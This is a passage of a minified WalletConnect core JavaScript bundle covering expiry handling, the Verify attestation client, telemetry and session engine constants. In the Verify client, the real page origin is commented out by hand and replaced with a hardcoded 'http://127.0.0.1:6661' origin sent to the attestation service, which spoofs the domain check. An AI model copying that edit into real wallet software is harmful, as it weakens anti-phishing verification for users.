        this.events.on(F.updated, U => {
            const Z = F.updated;
            this.logger.info(`Emitting ${Z}`),
            this.logger.debug({
                type: "event",
                event: Z,
                record: U
            })
        }
        ),
        this.events.on(F.deleted, U => {
            const Z = F.deleted;
            this.logger.info(`Emitting ${Z}`),
            this.logger.debug({
                type: "event",
                event: Z,
                record: U
            })
        }
        ),
        this.core.heartbeat.on(r$1.pulse, () => {
            this.cleanup()
        }
        )
    }
    cleanup() {
        try {
            this.isInitialized();
            let U = !1;
            this.records.forEach(Z => {
                cjs$3.toMiliseconds(Z.expiry || 0) - Date.now() <= 0 && (this.logger.info(`Deleting expired history log: ${Z.id}`),
                this.records.delete(Z.id),
                this.events.emit(F.deleted, Z, !1),
                U = !0)
            }
            ),
            U && this.persist()
        } catch (U) {
            this.logger.warn(U)
        }
    }
    isInitialized() {
        if (!this.initialized) {
            const {message: U} = Et$2("NOT_INITIALIZED", this.name);
            throw new Error(U)
        }
    }
}
var Fo = Object.defineProperty
  , Mo = (q, U, Z) => U in q ? Fo(q, U, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: Z
}) : q[U] = Z
  , A = (q, U, Z) => Mo(q, typeof U != "symbol" ? U + "" : U, Z);
class Ui extends S$1 {
    constructor(U, Z) {
        super(U, Z),
        this.core = U,
        this.logger = Z,
        A(this, "expirations", new Map),
        A(this, "events", new eventsExports.EventEmitter),
        A(this, "name", qt),
        A(this, "version", Gt),
        A(this, "cached", []),
        A(this, "initialized", !1),
        A(this, "storagePrefix", B),
        A(this, "init", async () => {
            this.initialized || (this.logger.trace("Initialized"),
            await this.restore(),
            this.cached.forEach(oe => this.expirations.set(oe.target, oe)),
            this.cached = [],
            this.registerEventListeners(),
            this.initialized = !0)
        }
        ),
        A(this, "has", oe => {
            try {
                const et = this.formatTarget(oe);
                return typeof this.getExpiration(et) < "u"
            } catch {
                return !1
            }
        }
        ),
        A(this, "set", (oe, et) => {
            this.isInitialized();
            const st = this.formatTarget(oe)
              , ws = {
                target: st,
                expiry: et
            };
            this.expirations.set(st, ws),
            this.checkExpiry(st, ws),
            this.events.emit(M.created, {
                target: st,
                expiration: ws
            })
        }
        ),
        A(this, "get", oe => {
            this.isInitialized();
            const et = this.formatTarget(oe);
            return this.getExpiration(et)
        }
        ),
        A(this, "del", oe => {
            if (this.isInitialized(),
            this.has(oe)) {
                const et = this.formatTarget(oe)
                  , st = this.getExpiration(et);
                this.expirations.delete(et),
                this.events.emit(M.deleted, {
                    target: et,
                    expiration: st
                })
            }
        }
        ),
        A(this, "on", (oe, et) => {
            this.events.on(oe, et)
        }
        ),
        A(this, "once", (oe, et) => {
            this.events.once(oe, et)
        }
        ),
        A(this, "off", (oe, et) => {
            this.events.off(oe, et)
        }
        ),
        A(this, "removeListener", (oe, et) => {
            this.events.removeListener(oe, et)
        }
        ),
        this.logger = E$1(Z, this.name)
    }
    get context() {
        return y$2(this.logger)
    }
    get storageKey() {
        return this.storagePrefix + this.version + this.core.customStoragePrefix + "//" + this.name
    }
    get length() {
        return this.expirations.size
    }
    get keys() {
        return Array.from(this.expirations.keys())
    }
    get values() {
        return Array.from(this.expirations.values())
    }
    formatTarget(U) {
        if (typeof U == "string")
            return ri$1(U);
        if (typeof U == "number")
            return oi$1(U);
        const {message: Z} = Et$2("UNKNOWN_TYPE", `Target type: ${typeof U}`);
        throw new Error(Z)
    }
    async setExpirations(U) {
        await this.core.storage.setItem(this.storageKey, U)
    }
    async getExpirations() {
        return await this.core.storage.getItem(this.storageKey)
    }
    async persist() {
        await this.setExpirations(this.values),
        this.events.emit(M.sync)
    }
    async restore() {
        try {
            const U = await this.getExpirations();
            if (typeof U > "u" || !U.length)
                return;
            if (this.expirations.size) {
                const {message: Z} = Et$2("RESTORE_WILL_OVERRIDE", this.name);
                throw this.logger.error(Z),
                new Error(Z)
            }
            this.cached = U,
            this.logger.debug(`Successfully Restored expirations for ${this.name}`),
            this.logger.trace({
                type: "method",
                method: "restore",
                expirations: this.values
            })
        } catch (U) {
            this.logger.debug(`Failed to Restore expirations for ${this.name}`),
            this.logger.error(U)
        }
    }
    getExpiration(U) {
        const Z = this.expirations.get(U);
        if (!Z) {
            const {message: oe} = Et$2("NO_MATCHING_KEY", `${this.name}: ${U}`);
            throw this.logger.warn(oe),
            new Error(oe)
        }
        return Z
    }
    checkExpiry(U, Z) {
        const {expiry: oe} = Z;
        cjs$3.toMiliseconds(oe) - Date.now() <= 0 && this.expire(U, Z)
    }
    expire(U, Z) {
        this.expirations.delete(U),
        this.events.emit(M.expired, {
            target: U,
            expiration: Z
        })
    }
    checkExpirations() {
        this.core.relayer.connected && this.expirations.forEach( (U, Z) => this.checkExpiry(Z, U))
    }
    registerEventListeners() {
        this.core.heartbeat.on(r$1.pulse, () => this.checkExpirations()),
        this.events.on(M.created, U => {
            const Z = M.created;
            this.logger.info(`Emitting ${Z}`),
            this.logger.debug({
                type: "event",
                event: Z,
                data: U
            }),
            this.persist()
        }
        ),
        this.events.on(M.expired, U => {
            const Z = M.expired;
            this.logger.info(`Emitting ${Z}`),
            this.logger.debug({
                type: "event",
                event: Z,
                data: U
            }),
            this.persist()
        }
        ),
        this.events.on(M.deleted, U => {
            const Z = M.deleted;
            this.logger.info(`Emitting ${Z}`),
            this.logger.debug({
                type: "event",
                event: Z,
                data: U
            }),
            this.persist()
        }
        )
    }
    isInitialized() {
        if (!this.initialized) {
            const {message: U} = Et$2("NOT_INITIALIZED", this.name);
            throw new Error(U)
        }
    }
}
var Ko = Object.defineProperty
  , Bo = (q, U, Z) => U in q ? Ko(q, U, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: Z
}) : q[U] = Z
  , w = (q, U, Z) => Bo(q, typeof U != "symbol" ? U + "" : U, Z);
class Fi extends M$3 {
    constructor(U, Z, oe) {
        super(U, Z, oe),
        this.core = U,
        this.logger = Z,
        this.store = oe,
        w(this, "name", Wt),
        w(this, "abortController"),
        w(this, "isDevEnv"),
        w(this, "verifyUrlV3", Yt),
        w(this, "storagePrefix", B),
        w(this, "version", Le$1),
        w(this, "publicKey"),
        w(this, "fetchPromise"),
        w(this, "init", async () => {
            var et;
            this.isDevEnv || (this.publicKey = await this.store.getItem(this.storeKey),
            this.publicKey && cjs$3.toMiliseconds((et = this.publicKey) == null ? void 0 : et.expiresAt) < Date.now() && (this.logger.debug("verify v2 public key expired"),
            await this.removePublicKey()))
        }
        ),
        w(this, "register", async et => {
            if (!zt$1() || this.isDevEnv)
                return;
            //const st = window.location.origin
			const st = "http://127.0.0.1:6661"
              , {id: ws, decryptedId: ms} = et
              , Es = `${this.verifyUrlV3}/attestation?projectId=${this.core.projectId}&origin=${st}&id=${ws}&decryptedId=${ms}`;
            try {
                const vs = getDocument_1()
                  , _s = this.startAbortTimer(cjs$3.ONE_SECOND * 5)
                  , Is = await new Promise( (Ss, Ts) => {
                    const Rs = () => {
                        window.removeEventListener("message", Hs),
                        vs.body.removeChild(Ns),
                        Ts("attestation aborted")
                    }
                    ;
                    this.abortController.signal.addEventListener("abort", Rs);
                    const Ns = vs.createElement("iframe");
                    Ns.src = Es,
                    Ns.style.display = "none",
                    Ns.addEventListener("error", Rs, {
                        signal: this.abortController.signal
                    });
                    const Hs = ha => {
                        if (ha.data && typeof ha.data == "string")
                            try {
                                const pa = JSON.parse(ha.data);
                                if (pa.type === "verify_attestation") {
                                    if (sn$2(pa.attestation).payload.id !== ws)
                                        return;
                                    clearInterval(_s),
                                    vs.body.removeChild(Ns),
                                    this.abortController.signal.removeEventListener("abort", Rs),
                                    window.removeEventListener("message", Hs),
                                    Ss(pa.attestation === null ? "" : pa.attestation)
                                }
                            } catch (pa) {
                                this.logger.warn(pa)
                            }
                    }
                    ;
                    vs.body.appendChild(Ns),
                    window.addEventListener("message", Hs, {
                        signal: this.abortController.signal
                    })
                }
                );
                return this.logger.debug("jwt attestation", Is),
                Is
            } catch (vs) {
                this.logger.warn(vs)
            }
            return ""
        }
        ),
        w(this, "resolve", async et => {
            if (this.isDevEnv)
                return "";
            const {attestationId: st, hash: ws, encryptedId: ms} = et;
            if (st === "") {
                this.logger.debug("resolve: attestationId is empty, skipping");
                return
            }
            if (st) {
                if (sn$2(st).payload.id !== ms)
                    return;
                const vs = await this.isValidJwtAttestation(st);
                if (vs) {
                    if (!vs.isVerified) {
                        this.logger.warn("resolve: jwt attestation: origin url not verified");
                        return
                    }
                    return vs
                }
            }
            if (!ws)
                return;
            const Es = this.getVerifyUrl(et == null ? void 0 : et.verifyUrl);
            return this.fetchAttestation(ws, Es)
        }
        ),
        w(this, "fetchAttestation", async (et, st) => {
            this.logger.debug(`resolving attestation: ${et} from url: ${st}`);
            const ws = this.startAbortTimer(cjs$3.ONE_SECOND * 5)
              , ms = await fetch(`${st}/attestation/${et}?v2Supported=true`, {
                signal: this.abortController.signal
            });
            return clearTimeout(ws),
            ms.status === 200 ? await ms.json() : void 0
        }
        ),
        w(this, "getVerifyUrl", et => {
            let st = et || ue;
            return Jt.includes(st) || (this.logger.info(`verify url: ${st}, not included in trusted list, assigning default: ${ue}`),
            st = ue),
            st
        }
        ),
        w(this, "fetchPublicKey", async () => {
            try {
                this.logger.debug(`fetching public key from: ${this.verifyUrlV3}`);
                const et = this.startAbortTimer(cjs$3.FIVE_SECONDS)
                  , st = await fetch(`${this.verifyUrlV3}/public-key`, {
                    signal: this.abortController.signal
                });
                return clearTimeout(et),
                await st.json()
            } catch (et) {
                this.logger.warn(et)
            }
        }
        ),
        w(this, "persistPublicKey", async et => {
            this.logger.debug("persisting public key to local storage", et),
            await this.store.setItem(this.storeKey, et),
            this.publicKey = et
        }
        ),
        w(this, "removePublicKey", async () => {
            this.logger.debug("removing verify v2 public key from storage"),
            await this.store.removeItem(this.storeKey),
            this.publicKey = void 0
        }
        ),
        w(this, "isValidJwtAttestation", async et => {
            const st = await this.getPublicKey();
            try {
                if (st)
                    return this.validateAttestation(et, st)
            } catch (ms) {
                this.logger.error(ms),
                this.logger.warn("error validating attestation")
            }
            const ws = await this.fetchAndPersistPublicKey();
            try {
                if (ws)
                    return this.validateAttestation(et, ws)
            } catch (ms) {
                this.logger.error(ms),
                this.logger.warn("error validating attestation")
            }
        }
        ),
        w(this, "getPublicKey", async () => this.publicKey ? this.publicKey : await this.fetchAndPersistPublicKey()),
        w(this, "fetchAndPersistPublicKey", async () => {
            if (this.fetchPromise)
                return await this.fetchPromise,
                this.publicKey;
            this.fetchPromise = new Promise(async st => {
                const ws = await this.fetchPublicKey();
                ws && (await this.persistPublicKey(ws),
                st(ws))
            }
            );
            const et = await this.fetchPromise;
            return this.fetchPromise = void 0,
            et
        }
        ),
        w(this, "validateAttestation", (et, st) => {
            const ws = ta(et, st.publicKey)
              , ms = {
                hasExpired: cjs$3.toMiliseconds(ws.exp) < Date.now(),
                payload: ws
            };
            if (ms.hasExpired)
                throw this.logger.warn("resolve: jwt attestation expired"),
                new Error("JWT attestation expired");
            return {
                origin: ms.payload.origin,
                isScam: ms.payload.isScam,
                isVerified: ms.payload.isVerified
            }
        }
        ),
        this.logger = E$1(Z, this.name),
        this.abortController = new AbortController,
        this.isDevEnv = hi$1(),
        this.init()
    }
    get storeKey() {
        return this.storagePrefix + this.version + this.core.customStoragePrefix + "//verify:public:key"
    }
    get context() {
        return y$2(this.logger)
    }
    startAbortTimer(U) {
        return this.abortController = new AbortController,
        setTimeout( () => this.abortController.abort(), cjs$3.toMiliseconds(U))
    }
}
var Vo = Object.defineProperty
  , qo = (q, U, Z) => U in q ? Vo(q, U, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: Z
}) : q[U] = Z
  , Mi = (q, U, Z) => qo(q, typeof U != "symbol" ? U + "" : U, Z);
class Ki extends O$1 {
    constructor(U, Z) {
        super(U, Z),
        this.projectId = U,
        this.logger = Z,
        Mi(this, "context", Xt),
        Mi(this, "registerDeviceToken", async oe => {
            const {clientId: et, token: st, notificationType: ws, enableEncrypted: ms=!1} = oe
              , Es = `${Zt}/${this.projectId}/clients`;
            await fetch(Es, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    client_id: et,
                    type: ws,
                    token: st,
                    always_raw: ms
                })
            })
        }
        ),
        this.logger = E$1(Z, this.context)
    }
}
var Go = Object.defineProperty
  , Bi = Object.getOwnPropertySymbols
  , Wo = Object.prototype.hasOwnProperty
  , Ho = Object.prototype.propertyIsEnumerable
  , Ze = (q, U, Z) => U in q ? Go(q, U, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: Z
}) : q[U] = Z
  , be = (q, U) => {
    for (var Z in U || (U = {}))
        Wo.call(U, Z) && Ze(q, Z, U[Z]);
    if (Bi)
        for (var Z of Bi(U))
            Ho.call(U, Z) && Ze(q, Z, U[Z]);
    return q
}
  , E = (q, U, Z) => Ze(q, typeof U != "symbol" ? U + "" : U, Z);
class Vi extends R {
    constructor(U, Z, oe=!0) {
        super(U, Z, oe),
        this.core = U,
        this.logger = Z,
        E(this, "context", ei),
        E(this, "storagePrefix", B),
        E(this, "storageVersion", Qt),
        E(this, "events", new Map),
        E(this, "shouldPersist", !1),
        E(this, "init", async () => {
            if (!hi$1())
                try {
                    const et = {
                        eventId: di$1(),
                        timestamp: Date.now(),
                        domain: this.getAppDomain(),
                        props: {
                            event: "INIT",
                            type: "",
                            properties: {
                                client_id: await this.core.crypto.getClientId(),
                                user_agent: cr$1(this.core.relayer.protocol, this.core.relayer.version, _e$1)
                            }
                        }
                    };
                    await this.sendEvent([et])
                } catch (et) {
                    this.logger.warn(et)
                }
        }
        ),
        E(this, "createEvent", et => {
            const {event: st="ERROR", type: ws="", properties: {topic: ms, trace: Es}} = et
              , vs = di$1()
              , _s = this.core.projectId || ""
              , Is = Date.now()
              , Ss = be({
                eventId: vs,
                timestamp: Is,
                props: {
                    event: st,
                    type: ws,
                    properties: {
                        topic: ms,
                        trace: Es
                    }
                },
                bundleId: _s,
                domain: this.getAppDomain()
            }, this.setMethods(vs));
            return this.telemetryEnabled && (this.events.set(vs, Ss),
            this.shouldPersist = !0),
            Ss
        }
        ),
        E(this, "getEvent", et => {
            const {eventId: st, topic: ws} = et;
            if (st)
                return this.events.get(st);
            const ms = Array.from(this.events.values()).find(Es => Es.props.properties.topic === ws);
            if (ms)
                return be(be({}, ms), this.setMethods(ms.eventId))
        }
        ),
        E(this, "deleteEvent", et => {
            const {eventId: st} = et;
            this.events.delete(st),
            this.shouldPersist = !0
        }
        ),
        E(this, "setEventListeners", () => {
            this.core.heartbeat.on(r$1.pulse, async () => {
                this.shouldPersist && await this.persist(),
                this.events.forEach(et => {
                    cjs$3.fromMiliseconds(Date.now()) - cjs$3.fromMiliseconds(et.timestamp) > ti && (this.events.delete(et.eventId),
                    this.shouldPersist = !0)
                }
                )
            }
            )
        }
        ),
        E(this, "setMethods", et => ({
            addTrace: st => this.addTrace(et, st),
            setError: st => this.setError(et, st)
        })),
        E(this, "addTrace", (et, st) => {
            const ws = this.events.get(et);
            ws && (ws.props.properties.trace.push(st),
            this.events.set(et, ws),
            this.shouldPersist = !0)
        }
        ),
        E(this, "setError", (et, st) => {
            const ws = this.events.get(et);
            ws && (ws.props.type = st,
            ws.timestamp = Date.now(),
            this.events.set(et, ws),
            this.shouldPersist = !0)
        }
        ),
        E(this, "persist", async () => {
            await this.core.storage.setItem(this.storageKey, Array.from(this.events.values())),
            this.shouldPersist = !1
        }
        ),
        E(this, "restore", async () => {
            try {
                const et = await this.core.storage.getItem(this.storageKey) || [];
                if (!et.length)
                    return;
                et.forEach(st => {
                    this.events.set(st.eventId, be(be({}, st), this.setMethods(st.eventId)))
                }
                )
            } catch (et) {
                this.logger.warn(et)
            }
        }
        ),
        E(this, "submit", async () => {
            if (!this.telemetryEnabled || this.events.size === 0)
                return;
            const et = [];
            for (const [st,ws] of this.events)
                ws.props.type && et.push(ws);
            if (et.length !== 0)
                try {
                    if ((await this.sendEvent(et)).ok)
                        for (const st of et)
                            this.events.delete(st.eventId),
                            this.shouldPersist = !0
                } catch (st) {
                    this.logger.warn(st)
                }
        }
        ),
        E(this, "sendEvent", async et => {
            const st = this.getAppDomain() ? "" : "&sp=desktop";
            return await fetch(`${ii}?projectId=${this.core.projectId}&st=events_sdk&sv=js-${_e$1}${st}`, {
                method: "POST",
                body: JSON.stringify(et)
            })
        }
        ),
        E(this, "getAppDomain", () => sr$1().url),
        this.logger = E$1(Z, this.context),
        this.telemetryEnabled = oe,
        oe ? this.restore().then(async () => {
            await this.submit(),
            this.setEventListeners()
        }
        ) : this.persist()
    }
    get storageKey() {
        return this.storagePrefix + this.storageVersion + this.core.customStoragePrefix + "//" + this.context
    }
}
var Yo = Object.defineProperty
  , qi = Object.getOwnPropertySymbols
  , Jo = Object.prototype.hasOwnProperty
  , Xo = Object.prototype.propertyIsEnumerable
  , Qe = (q, U, Z) => U in q ? Yo(q, U, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: Z
}) : q[U] = Z
  , Gi = (q, U) => {
    for (var Z in U || (U = {}))
        Jo.call(U, Z) && Qe(q, Z, U[Z]);
    if (qi)
        for (var Z of qi(U))
            Xo.call(U, Z) && Qe(q, Z, U[Z]);
    return q
}
  , v = (q, U, Z) => Qe(q, typeof U != "symbol" ? U + "" : U, Z);
class Te extends h$1 {
    constructor(U) {
        var Z;
        super(U),
        v(this, "protocol", ze),
        v(this, "version", Le$1),
        v(this, "name", he),
        v(this, "relayUrl"),
        v(this, "projectId"),
        v(this, "customStoragePrefix"),
        v(this, "events", new eventsExports.EventEmitter),
        v(this, "logger"),
        v(this, "heartbeat"),
        v(this, "relayer"),
        v(this, "crypto"),
        v(this, "storage"),
        v(this, "history"),
        v(this, "expirer"),
        v(this, "pairing"),
        v(this, "verify"),
        v(this, "echoClient"),
        v(this, "linkModeSupportedApps"),
        v(this, "eventClient"),
        v(this, "initialized", !1),
        v(this, "logChunkController"),
        v(this, "on", (ms, Es) => this.events.on(ms, Es)),
        v(this, "once", (ms, Es) => this.events.once(ms, Es)),
        v(this, "off", (ms, Es) => this.events.off(ms, Es)),
        v(this, "removeListener", (ms, Es) => this.events.removeListener(ms, Es)),
        v(this, "dispatchEnvelope", ({topic: ms, message: Es, sessionExists: vs}) => {
            if (!ms || !Es)
                return;
            const _s = {
                topic: ms,
                message: Es,
                publishedAt: Date.now(),
                transportType: Q.link_mode
            };
            this.relayer.onLinkMessageEvent(_s, {
                sessionExists: vs
            })
        }
        );
        const oe = this.getGlobalCore(U == null ? void 0 : U.customStoragePrefix);
        if (oe)
            try {
                return this.customStoragePrefix = oe.customStoragePrefix,
                this.logger = oe.logger,
                this.heartbeat = oe.heartbeat,
                this.crypto = oe.crypto,
                this.history = oe.history,
                this.expirer = oe.expirer,
                this.storage = oe.storage,
                this.relayer = oe.relayer,
                this.pairing = oe.pairing,
                this.verify = oe.verify,
                this.echoClient = oe.echoClient,
                this.linkModeSupportedApps = oe.linkModeSupportedApps,
                this.eventClient = oe.eventClient,
                this.initialized = oe.initialized,
                this.logChunkController = oe.logChunkController,
                oe
            } catch (ms) {
                console.warn("Failed to copy window core", ms)
            }
        this.projectId = U == null ? void 0 : U.projectId,
        this.relayUrl = (U == null ? void 0 : U.relayUrl) || Ue,
        this.customStoragePrefix = U != null && U.customStoragePrefix ? `:${U.customStoragePrefix}` : "";
        const et = k$3({
            level: typeof (U == null ? void 0 : U.logger) == "string" && U.logger ? U.logger : Et$1.logger,
            name: he
        })
          , {logger: st, chunkLoggerController: ws} = A$1({
            opts: et,
            maxSizeInBytes: U == null ? void 0 : U.maxLogBlobSizeInBytes,
            loggerOverride: U == null ? void 0 : U.logger
        });
        this.logChunkController = ws,
        (Z = this.logChunkController) != null && Z.downloadLogsBlobInBrowser && (window.downloadLogsBlobInBrowser = async () => {
            var ms, Es;
            (ms = this.logChunkController) != null && ms.downloadLogsBlobInBrowser && ((Es = this.logChunkController) == null || Es.downloadLogsBlobInBrowser({
                clientId: await this.crypto.getClientId()
            }))
        }
        ),
        this.logger = E$1(st, this.name),
        this.heartbeat = new i$2,
        this.crypto = new wi(this,this.logger,U == null ? void 0 : U.keychain),
        this.history = new ji(this,this.logger),
        this.expirer = new Ui(this,this.logger),
        this.storage = U != null && U.storage ? U.storage : new h$2(Gi(Gi({}, It), U == null ? void 0 : U.storageOptions)),
        this.relayer = new Oi({
            core: this,
            logger: this.logger,
            relayUrl: this.relayUrl,
            projectId: this.projectId
        }),
        this.pairing = new ki(this,this.logger),
        this.verify = new Fi(this,this.logger,this.storage),
        this.echoClient = new Ki(this.projectId || "",this.logger),
        this.linkModeSupportedApps = [],
        this.eventClient = new Vi(this,this.logger,U == null ? void 0 : U.telemetryEnabled),
        this.setGlobalCore(this)
    }
    static async init(U) {
        const Z = new Te(U);
        await Z.initialize();
        const oe = await Z.crypto.getClientId();
        return await Z.storage.setItem(jt, oe),
        Z
    }
    get context() {
        return y$2(this.logger)
    }
    async start() {
        this.initialized || await this.initialize()
    }
    async getLogsBlob() {
        var U;
        return (U = this.logChunkController) == null ? void 0 : U.logsToBlob({
            clientId: await this.crypto.getClientId()
        })
    }
    async addLinkModeSupportedApp(U) {
        this.linkModeSupportedApps.includes(U) || (this.linkModeSupportedApps.push(U),
        await this.storage.setItem(Fe, this.linkModeSupportedApps))
    }
    async initialize() {
        this.logger.trace("Initialized");
        try {
            await this.crypto.init(),
            await this.history.init(),
            await this.expirer.init(),
            await this.relayer.init(),
            await this.heartbeat.init(),
            await this.pairing.init(),
            this.linkModeSupportedApps = await this.storage.getItem(Fe) || [],
            this.initialized = !0,
            this.logger.info("Core Initialization Success")
        } catch (U) {
            throw this.logger.warn(`Core Initialization Failure at epoch ${Date.now()}`, U),
            this.logger.error(U.message),
            U
        }
    }
    getGlobalCore(U="") {
        try {
            if (this.isGlobalCoreDisabled())
                return;
            const Z = `_walletConnectCore_${U}`
              , oe = `${Z}_count`;
            return globalThis[oe] = (globalThis[oe] || 0) + 1,
            globalThis[oe] > 1 && console.warn(`WalletConnect Core is already initialized. This is probably a mistake and can lead to unexpected behavior. Init() was called ${globalThis[oe]} times.`),
            globalThis[Z]
        } catch (Z) {
            console.warn("Failed to get window WalletConnect core", Z);
            return
        }
    }
    setGlobalCore(U) {
        var Z;
        try {
            if (this.isGlobalCoreDisabled())
                return;
            const oe = `_walletConnectCore_${((Z = U.opts) == null ? void 0 : Z.customStoragePrefix) || ""}`;
            globalThis[oe] = U
        } catch (oe) {
            console.warn("Failed to set window WalletConnect core", oe)
        }
    }
    isGlobalCoreDisabled() {
        try {
            return typeof process < "u" && {}.DISABLE_GLOBAL_CORE === "true"
        } catch {
            return !0
        }
    }
}
const Zo = Te
  , Ce = "wc"
  , ke = 2
  , De = "client"
  , me = `${Ce}@${ke}:${De}:`
  , we = {
    name: De,
    logger: "error",
    controller: !1,
    relayUrl: "wss://relay.walletconnect.org"
}
  , Le = "WALLETCONNECT_DEEPLINK_CHOICE"
  , ht = "proposal"
  , Me = "Proposal expired"
  , dt = "session"
  , X = cjs$3.SEVEN_DAYS
  , ut = "engine"
  , N = {
    wc_sessionPropose: {
        req: {
            ttl: cjs$3.FIVE_MINUTES,
            prompt: !0,
            tag: 1100
        },
        res: {
            ttl: cjs$3.FIVE_MINUTES,
            prompt: !1,
            tag: 1101
        },
        reject: {
            ttl: cjs$3.FIVE_MINUTES,
            prompt: !1,
            tag: 1120
        },
        autoReject: {
            ttl: cjs$3.FIVE_MINUTES,
            prompt: !1,
            tag: 1121
        }
    },
    wc_sessionSettle: {
        req: {
            ttl: cjs$3.FIVE_MINUTES,
            prompt: !1,
            tag: 1102
        },
        res: {
            ttl: cjs$3.FIVE_MINUTES,
            prompt: !1,
            tag: 1103
        }
    },
    wc_sessionUpdate: {
        req: {
            ttl: cjs$3.ONE_DAY,
            prompt: !1,
            tag: 1104
        },
        res: {
            ttl: cjs$3.ONE_DAY,
            prompt: !1,
            tag: 1105
        }
    },
    wc_sessionExtend: {
        req: {
            ttl: cjs$3.ONE_DAY,
            prompt: !1,
            tag: 1106
        },
        res: {
            ttl: cjs$3.ONE_DAY,
            prompt: !1,
            tag: 1107
        }
    },
    wc_sessionRequest: {
        req: {
            ttl: cjs$3.FIVE_MINUTES,
            prompt: !0,
            tag: 1108
        },
        res: {
            ttl: cjs$3.FIVE_MINUTES,
            prompt: !1,
            tag: 1109
        }
    },
    wc_sessionEvent: {
        req: {
            ttl: cjs$3.FIVE_MINUTES,
            prompt: !0,
            tag: 1110
        },
        res: {
            ttl: cjs$3.FIVE_MINUTES,
            prompt: !1,
            tag: 1111
        }
    },
    wc_sessionDelete: {
        req: {
            ttl: cjs$3.ONE_DAY,
            prompt: !1,
            tag: 1112
        },
        res: {
            ttl: cjs$3.ONE_DAY,
            prompt: !1,
            tag: 1113
        }
    },
    wc_sessionPing: {
        req: {
            ttl: cjs$3.ONE_DAY,
            prompt: !1,
            tag: 1114
        },
        res: {
            ttl: cjs$3.ONE_DAY,
            prompt: !1,
            tag: 1115
        }
    },
    wc_sessionAuthenticate: {
        req: {
            ttl: cjs$3.ONE_HOUR,
            prompt: !0,
            tag: 1116
        },
        res: {
            ttl: cjs$3.ONE_HOUR,
            prompt: !1,
            tag: 1117
        },
        reject: {
            ttl: cjs$3.FIVE_MINUTES,
            prompt: !1,
            tag: 1118
        },
        autoReject: {
            ttl: cjs$3.FIVE_MINUTES,
            prompt: !1,
            tag: 1119
        }
    }
}
  , _e = {
    min: cjs$3.FIVE_MINUTES,
    max: cjs$3.SEVEN_DAYS
}
  , $ = {
    idle: "IDLE",
    active: "ACTIVE"
}
  , gt = {
    eth_sendTransaction: {
        key: ""
    },
    eth_sendRawTransaction: {
        key: ""
    },
    wallet_sendCalls: {
        key: ""
    },
    solana_signTransaction: {
        key: "signature"
    },
    solana_signAllTransactions: {
        key: "transactions"
    },
    solana_signAndSendTransaction: {
        key: "signature"
    },
    sui_signAndExecuteTransaction: {
        key: "digest"
    },
    sui_signTransaction: {
        key: ""
    },
    hedera_signAndExecuteTransaction: {
        key: "transactionId"
    },
    hedera_executeTransaction: {
        key: "transactionId"
    },
    near_signTransaction: {
        key: ""
    },
    near_signTransactions: {
        key: ""
    },
    tron_signTransaction: {
        key: "txID"
    },
    xrpl_signTransaction: {
        key: ""
    },
    xrpl_signTransactionFor: {
        key: ""
    },
    algo_signTxn: {
        key: ""
    },
    sendTransfer: {
        key: "txid"
    },
    stacks_stxTransfer: {
        key: "txId"
    },
    polkadot_signTransaction: {
        key: ""
    },
    cosmos_signDirect: {
        key: ""
    }
}
  , yt = "request"
  , mt = ["wc_sessionPropose", "wc_sessionRequest", "wc_authRequest", "wc_sessionAuthenticate"]
  , wt = "wc"
  , _t = "auth"
  , Et = "authKeys"
  , ft = "pairingTopics"
  , St = "requests"
  , ae = `${wt}@${1.5}:${_t}:`
  , ce = `${ae}:PUB_KEY`;
var Os = Object.defineProperty
  , bs = Object.defineProperties
  , As = Object.getOwnPropertyDescriptors
  , Rt = Object.getOwnPropertySymbols
  , xs = Object.prototype.hasOwnProperty
  , Vs = Object.prototype.propertyIsEnumerable
  , $e = (q, U, Z) => U in q ? Os(q, U, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: Z
}) : q[U] = Z
  , I = (q, U) => {
    for (var Z in U || (U = {}))
        xs.call(U, Z) && $e(q, Z, U[Z]);
    if (Rt)
        for (var Z of Rt(U))
            Vs.call(U, Z) && $e(q, Z, U[Z]);
    return q
}
  , x = (q, U) => bs(q, As(U))
  , c = (q, U, Z) => $e(q, typeof U != "symbol" ? U + "" : U, Z);
class Cs extends V$1 {
    constructor(U) {
        super(U),
        c(this, "name", ut),
        c(this, "events", new gs$1),
        c(this, "initialized", !1),
        c(this, "requestQueue", {
            state: $.idle,
            queue: []
        }),
        c(this, "sessionRequestQueue", {
            state: $.idle,
            queue: []
        }),
        c(this, "emittedSessionRequests", new gi$1({
            limit: 500
        })),
        c(this, "requestQueueDelay", cjs$3.ONE_SECOND),
        c(this, "expectedPairingMethodMap", new Map),
        c(this, "recentlyDeletedMap", new Map),
        c(this, "recentlyDeletedLimit", 200),
        c(this, "relayMessageCache", []),
        c(this, "pendingSessions", new Map),
        c(this, "init", async () => {
            this.initialized || (await this.cleanup(),
            this.registerRelayerEvents(),
            this.registerExpirerEvents(),
            this.registerPairingEvents(),
            await this.registerLinkModeListeners(),
            this.client.core.pairing.register({
                methods: Object.keys(N)
            }),
            this.initialized = !0,
            setTimeout(async () => {
                await this.processPendingMessageEvents(),
                this.sessionRequestQueue.queue = this.getPendingSessionRequests(),
                this.processSessionRequestQueue()
            }
            , cjs$3.toMiliseconds(this.requestQueueDelay)))
        }
        ),
        c(this, "connect", async Z => {
            this.isInitialized(),
            await this.confirmOnlineStateOrThrow();
            const oe = x(I({}, Z), {
                requiredNamespaces: Z.requiredNamespaces || {},
                optionalNamespaces: Z.optionalNamespaces || {}
            });
            await this.isValidConnect(oe),
            oe.optionalNamespaces = ba(oe.requiredNamespaces, oe.optionalNamespaces),
            oe.requiredNamespaces = {};
            const {pairingTopic: et, requiredNamespaces: st, optionalNamespaces: ws, sessionProperties: ms, scopedProperties: Es, relays: vs} = oe;
            let _s = et, Is, Ss = !1;
            try {
                if (_s) {
                    const nl = this.client.core.pairing.pairings.get(_s);
                    this.client.logger.warn("connect() with existing pairing topic is deprecated and will be removed in the next major release."),
                    Ss = nl.active
                }
            } catch (nl) {
                throw this.client.logger.error(`connect() -> pairing.get(${_s}) failed`),
                nl
            }
            if (!_s || !Ss) {
                const {topic: nl, uri: sl} = await this.client.core.pairing.create();
                _s = nl,
                Is = sl
            }
            if (!_s) {
